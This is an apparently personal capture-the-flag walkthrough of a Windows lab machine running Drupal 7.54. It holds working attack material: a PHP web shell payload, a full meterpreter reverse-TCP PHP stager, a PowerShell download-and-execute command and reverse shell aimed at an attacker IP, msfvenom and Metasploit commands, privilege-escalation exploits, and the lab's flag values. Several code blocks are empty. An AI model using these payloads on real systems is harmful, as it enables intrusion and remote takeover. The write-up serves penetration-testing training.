Seems like the site is using `Drupal 7.xx` as it's [Content Management System](https://www.ibm.com/topics/content-management-system).
From our `nmap` scan we see some interesting to us endpoints, including the `/CHANGELOG.txt` file.

![](../../../assets/88afffb037a71824016c24e3fdceb4a6.png)

## Exploit.db
It appears the target machine is using `Drupal 7.54`. Let's try to find out more about this version.

![](../../../assets/b675f101fd4cee94516d2aaddff935ed.png)

We have a `CVE` and a script which we can use, let's download it and run it against the target.
I have modified the script to suit our purpose:

```php
define('QID', 'anything');
define('TYPE_PHP', 'application/vnd.php.serialized');
define('TYPE_JSON', 'application/json');
define('CONTROLLER', 'user');
define('ACTION', 'login');

$url = 'http://10.10.10.9';
$endpoint_path = '/rest';
$endpoint = 'rest_endpoint';

$file = [
    'filename' => 'pwned.php',
    'data' => '<?php echo(system($_GET["cmd"])); ?>'
];
```

>The above `/rest` endpoint can be found by doing a `directory enumeration`. As `gobuster` as well as `dirsearch` were incredibly slow for this machine I lost my patience and decided to cheat by searching it up.

Now that our script is modified we need to install `php-curl` first before moving on or it will throw an error.

As soon as it is it done we can run the exploit with `php 41564.php`:

```bash

```

Now that we have all these juicy details we can start utilizing it. We put the `admin` hash inside a file called `admin.hash` and try to crack it using `Hashcat`:

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ hashcat admin.hash

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

7900 | Drupal7 | Forums, CMS, E-Commerce
```

We figured out it's a Drupal7 hash (as expected) and the mode for it is `7900`.

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ hashcat -m 7900 admin.hash /usr/share/wordlists/rockyou.txt.gz -o cracked.txt --force
```

While that is cracking we'll try our chances at the web shell which we have got:

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ curl http://10.10.10.9/writeup.php?cmd=whoami                 
nt authority\iusr
```

It appears that we are the `iusr` user.


## 80/TCP - HTTP

After this I tried some different methods but failed, thus I retraced back to the `session.json` file and nabbed the `name and id` from it and pasted them into the `network` tab on the webpage. I then went to the `/admin` endpoint and got easy access  as the `admin` account.

![](../../../assets/be3cf5a7c382c3484bfd33d2ff6711aa.png)

When enumerating the site further we stumble upon the `Find content tab`.

![](../../../assets/0de755c59305000cec3d969449370ad6.png)

Funny, we can find an exploit that matches these exact criteria:

```bash
# CVE-2018-7602
You must be authenticated and with the power of deleting a node. Some other forms may be vulnerable : at least, all of forms that is in 2-step (form then confirm).
```

We can download [this script](https://raw.githubusercontent.com/oways/SA-CORE-2018-004/master/drupalgeddon3.py) and use it along with our `admin cookie` in order to get `Remote code execution`.

```bash
┌──(kali㉿kali)-[~]

```

In our case it should look like this:

```bash

```

Yet again we get the output we want, great.

### Nishang shell
Now we need to upload a `powershell reverse-shell`. For this we will use [this Nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) script. Save this shell under `shell.ps1`. We just need to add this line all the way in the end of the file:

```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.24 -Port 443
```

We can now try to upload this shell using the following commands, and of course we don't forget our listener!

```bash
python drup.py http://10.10.10.9/ "SESSd873f26fc11f2b7e6e4aa0f6fce59913=N0MMmkYGRL3LvgNNt7_gwYiY4CiP7tdVphB6Rws3_G8" 1 "powershell iex(new-object net.webclient).downloadstring('http://10.10.14.24/shell.ps1')"
```

```bash
python -m http.server 80
```

```bash
nc -lvnp 443
```

And it should work just fine!

```

By checking the `systeminfo` we notice that it's a totally fresh installed version of `Windows Server 2008`. Let's see if there's any noticeable exploits for it. After checking out [this GitHub page](https://github.com/SecWiki/windows-kernel-exploits/tree/master) there's one that might be the most useful to us: `MS15-051`.

I downloaded the `MS15-051-KB3045171.zip` folder and then unzipped it.

```bash
┌──(kali㉿kali)-[~/Downloads/MS15-051-KB3045171]
└─$ ls -l
total 108
drwxrwxr-x 3 kali kali  4096 Nov  7  2015 Source
-rw-rw-r-- 1 kali kali 48128 May 13  2015 ms15-051.exe
-rw-rw-r-- 1 kali kali 55296 May 13  2015 ms15-051x64.exe
```

From here we want to upload the `x64` version to the machine and then run it.

## Privilege Escalation
We upload and run the script using the following command:

```powershell
\\10.10.14.24\kali\ms15-051.exe "whoami"
```

Unsuccessful, the above attempt did not work on any of the resets so I tried different methods.

After a long while of searching and digging I settled on [another walkthrough](https://blog.amartinsec.com/writeups/bastard_htb/) and decided to follow their methods.


### Meterpreter

Since the previous attempts failed I decided to use the `meterpreter` method instead. For that we'll have to modify our original file with which we uploaded to the website.

```php
$url = 'http://10.10.10.9';
$endpoint_path = '/rest';
$endpoint = 'rest_endpoint';

$payload = <<<'EOD'
/*<?php /**/ error_reporting(0); $ip = '10.10.14.13'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
EOD;

$file = [
    'filename' => 'shelly.php',
    'data' => $payload
];

# Ironically Windows Defender deleted my whole writeup because of this code block
```

I also configured a `PHP msfvenom payload`:

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f raw -o shell.php
```

After the payload has been configured we'll want to boot up `metasploit` and start a listener:

```bash
msfconsole
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 4444
run
```

Now that the listener is ready I ran the exploit again:

```bash
php 41564.php
```

Now I generated `another Windows Meterpreter` payload with `msfvenom`:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=4445 -f exe -o shell.exe
```

After this I opened a new tab and in there I booted another instance of `msfconsole`:

```bash
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 4445
run
```

Next thing I did was upload the payload to the target. Within the `first msfconsole` I uploaded the `shell.exe` file we created using:

```bash
upload shell.exe
```

Once it is uploaded I started it up using:

```bash
execute -f shell.exe
```

![](../../../assets/1622a37d5afc495611fa82370ca0f9d7.png)

### Local Exploit Suggester
Now that all the previous steps are done we can start enumerating the machine and finding vulnerabilities for it. We can use [this script for it](Windows%20Privilege%20Escalation.md#Metasploit#Exploit%20Suggester)

```bash
run post/multi/recon/local_exploit_suggester
```

After running the above I went with `windows/local/ms16_075_reflection_juicy`. I `backgrounded` my `meterpreter session` and set up the new exploit as follows:

```bash
background
# note the session number
use exploit/windows/local/ms16_075_reflection_juicy
set session <session number>
set LHOST tun0
set LPORT 4446
run
```

![](../../../assets/ed3ac3a953bb8b6cb9cb06b6e5b171e0.png)

As you can see we get a `root shell`.


## Flags

### user.txt
I got the `user` flag before the `Meterpreter` attempt.
```powershell
PS C:\Users\dimitris\Desktop> type user.txt
0fb85bcc135192b0b0b8d4b03e5fdc8e
```

### root.txt
Instead of going through the `shell` method I opted the easy way:
```bash
meterpreter > cat "C:\Users\Administrator\Desktop\root.txt"
82572a3766e1592c7522f67dad6b7e41
```

>All in all this was the first `Medium` box for me and it really showed. I struggled significantly and had to use lots of resources to get a proper foothold.
